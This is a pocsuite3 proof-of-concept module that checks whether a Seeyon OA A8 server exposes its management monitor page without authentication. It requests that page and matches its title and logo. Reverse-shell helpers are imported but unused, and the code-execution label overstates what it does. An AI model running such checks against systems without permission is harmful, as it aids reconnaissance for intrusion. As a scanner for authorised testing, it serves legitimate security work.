from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class DemoPOC(POCBase):
    vulID = '123'  # ssvid
    version = '1.0'
    name = '致远OA A8 未授权访问弱口令'
    appName = '致远OA A8 未授权访问弱口令'
    appVersion = 'v5'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''致远OA A8 未授权访问'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/seeyon/management/index.jsp"
            r = requests.get(url=target,timeout=5,verify=False)
            if r.status_code == 200 and "A8 Management Monitor" in r.text and "../common/images/A8-logo.gif" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                return self.parse_output(result)
        except Exception as e:
            print(e)
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)